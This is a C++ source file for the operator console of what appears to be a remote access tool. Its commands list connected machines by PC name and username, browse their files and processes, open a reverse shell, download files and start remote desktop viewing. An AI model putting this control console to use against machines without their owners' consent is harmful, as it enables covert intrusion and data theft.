#include "SimpleConsoleUiMediator.h"
#include "../../../../shared/IOLib/services/StringService.h"
#include "../../../models/Client.h"
#include <sstream>
#include <iostream>
#include "../../../Application.h"


SimpleConsoleUiMediator::SimpleConsoleUiMediator(Application* application)
	: running(false), isStreamingDesktop(false), application(application)
{
	InitializeSRWLock(&clientLock);
	InitializeSRWLock(&viewLock);
}

SimpleConsoleUiMediator::~SimpleConsoleUiMediator()
{
}

void SimpleConsoleUiMediator::loop()
{
	char line[256];
	running = true;
	while (running)
	{
		appConsole.printBanner();
		appConsole.getLine(line, 256);
		if (!handleInstruction(line))
		{
			appConsole.printf("Unknown instruction %s\n", line);
			continue;
		}
	}
}

void SimpleConsoleUiMediator::showMainUi()
{
	appConsole.showMainUi();
}


void SimpleConsoleUiMediator::printHelp()
{
}

// Check instruction if may be handled without being forwarded to the uiEventChannel, return true in this case, false otherwise
bool SimpleConsoleUiMediator::handleInstruction(char* instruction)
{
	if (appConsole.isInteracting())
	{
		AcquireSRWLockShared(&clientLock);
		Client* client = appConsole.getClient();

		AcquireSRWLockShared(&viewLock);
		if (appConsole.currentView == View::ReverseShell)
		{
			application->sendShellCommand(client, instruction);
			threadPool.post([&]()
			{
			});

			ReleaseSRWLockShared(&clientLock);
			ReleaseSRWLockShared(&viewLock);
			return true;
		}

		ReleaseSRWLockShared(&viewLock);

		if (StringService::startsWith(instruction, "ls"))
		{
			std::wstring finalPath = getFilePath(instruction);

			threadPool.post([finalPath, client, this]()
			{
				application->listFiles(client, finalPath);
			});

			ReleaseSRWLockShared(&clientLock);
			return true;
		}

		if (StringService::equalInsensitive(instruction, "ps"))
		{
			threadPool.post([this]()
			{
				application->requestProcessList(appConsole.getClient());
			});
			ReleaseSRWLockShared(&clientLock);
			return true;
		}
		else if (StringService::equalInsensitive(instruction, "shell") && appConsole.isInteracting())
		{
			AcquireSRWLockExclusive(&viewLock);
			appConsole.currentView = View::ReverseShell;
			ReleaseSRWLockExclusive(&viewLock);
			threadPool.post([this]()
			{
				application->requestReverseShell(appConsole.getClient());
			});
		}
		else if (StringService::startsWith(instruction, "download"))
		{
			if (appConsole.isInteracting())
			{
				const std::wstring filePath = getFilePath(instruction);

				threadPool.post([filePath, this]()
				{
					application->downloadFile(appConsole.getClient(), filePath);
				});
			}
			else appConsole.println("You must be interacting with a client");

			ReleaseSRWLockShared(&clientLock);
			return true;
		}
		else if (

			(StringService::equalInsensitive(instruction, "start") && appConsole.currentView == View::RemoteDesktop)
			||
			(StringService::equalInsensitive(instruction, "desktop start"))

		)
		{
			threadPool.post([this,client]()
			{
				application->startRemoteDesktop(client);
			});
			ReleaseSRWLockShared(&clientLock);
			return true;
		}

		ReleaseSRWLockShared(&clientLock);
	}
	else
	{
		if (StringService::startsWith(instruction, "interact"))
		{
			std::string instructionStr = instruction;
			size_t pos = instructionStr.find(" ");
			std::string token = instructionStr.substr(0, pos);
			instructionStr.erase(0, pos + 1);

			std::istringstream iss(instructionStr);
			unsigned long long clientId;
			iss >> clientId;

			threadPool.post([this, clientId]()
			{
				Client* client = application->getClient(clientId);

				if (client != nullptr)
				{
					AcquireSRWLockExclusive(&clientLock);
					if (application->canInteractWith(clientId))
					{
						appConsole.setInteractionView(client);
					}
					ReleaseSRWLockExclusive(&clientLock);
				}
			});
			return true;
		}
		else if (StringService::equalInsensitive("list sessions", instruction))
		{
			// return new AppEvent(Target::Server, Subject::Connection, Action::ListAvailable);
			threadPool.post([this]()
			{
				const std::vector<Client*> clients = application->getClients();
				appConsole.printClients(clients);
			});
			return true;
		}
		else if (StringService::startsWith(instruction, "ls"))
		{
			AcquireSRWLockShared(&viewLock);
			if (appConsole.currentView == View::Main)
			{
				ReleaseSRWLockShared(&viewLock);
				// return new AppEvent(Target::Server, Subject::Connection, Action::ListAvailable);
				threadPool.post([this]()
				{
					std::vector<Client*> clients = application->getClients();
					appConsole.printClients(clients);
					appConsole.printBanner();
				});
			}
			return true;
		}
	}


	return false;
}

std::wstring SimpleConsoleUiMediator::getFilePath(char* instruction)
{
	std::wstring finalPath;

	AcquireSRWLockShared(&viewLock);
	if (instruction[2] == 0x00 &&
		appConsole.currentView != View::Filesystem)
	{
		finalPath.append(L"/");
	}
	else
	{
		std::wstring relativePath = StringService::chartoWString(instruction);
		const size_t pos = relativePath.find(L" ");
		if (pos != std::string::npos)
		{
			// Remove "ls " from the instruction string
			relativePath.erase(0, pos + 1);
		}

		if (appConsole.currentView == View::Filesystem)
		{
			const std::wstring basePath = appConsole.getCurrentPath();
			finalPath.append(basePath);

			if (finalPath.compare(finalPath.size() - 1, 1, L"/") != 0
				&& finalPath.compare(finalPath.size() - 1, 1, L"\\") != 0)
				finalPath.append(L"/");

			if (pos != std::string::npos)
				finalPath.append(relativePath);
		}
		else
		{
			if (pos != std::string::npos)
				finalPath.append(relativePath);
			else
				finalPath.append(L"/");
		}
	}

	ReleaseSRWLockShared(&viewLock);
	return finalPath;
}

void SimpleConsoleUiMediator::stop()
{
	running = false;
}

void SimpleConsoleUiMediator::updateStatus(const std::string& statusMessage)
{
	appConsole.println(statusMessage, true);
	appConsole.printBanner();
}

void SimpleConsoleUiMediator::showErrorMessage(const char* str)
{
	appConsole.printErrorLine(str);
	appConsole.printBanner();
}

void SimpleConsoleUiMediator::showErrorMessage(const std::string& str)
{
	appConsole.printErrorLine(str);
	appConsole.printBanner();
}

void SimpleConsoleUiMediator::addFeedbackMessage(const std::string& message)
{
	appConsole.println(message);
	appConsole.printBanner();
}

void SimpleConsoleUiMediator::showImage(char* image_bytes, unsigned long long image_size)
{
	if (!isStreamingDesktop)
	{
		isStreamingDesktop = true;
	}

	delete image_bytes;
	appConsole.printBanner();
}

void SimpleConsoleUiMediator::addClientRow(Client* client)
{
	appConsole.printf(true,
	                  "New client connected\n\tID: %s\n\tPcName: %s\n\tUsername: %s\n\n\n",
	                  std::to_string(client->getId()).c_str(),
	                  client->getPcName().c_str(),
	                  client->getUsername().c_str());

	appConsole.setInteractionView(client);

	appConsole.printBanner();
}

void SimpleConsoleUiMediator::showProcessList(Client* client, std::vector<Process>* processes)
{
	appConsole.showProcesses(client, processes);
	delete processes;
	appConsole.printBanner();
}

void SimpleConsoleUiMediator::removeClient(Client* client)
{
	appConsole.removeClient(client);
	appConsole.printBanner();
}

void SimpleConsoleUiMediator::onShellOutput(Client* client, const std::string& data)
{
	appConsole.print(data);

	AcquireSRWLockShared(&clientLock);
	if (appConsole.currentView != View::ReverseShell)
		appConsole.printBanner();
	ReleaseSRWLockShared(&clientLock);
}

void SimpleConsoleUiMediator::onShellClosed(Client* client)
{
	if (appConsole.currentView == View::ReverseShell)
	{
		appConsole.println("Shell closed");
		if (appConsole.getClient() == client)
		{
			AcquireSRWLockExclusive(&viewLock);
			appConsole.currentView = View::ClientInteraction;
			ReleaseSRWLockExclusive(&viewLock);
		}
	}

	appConsole.printBanner();
}
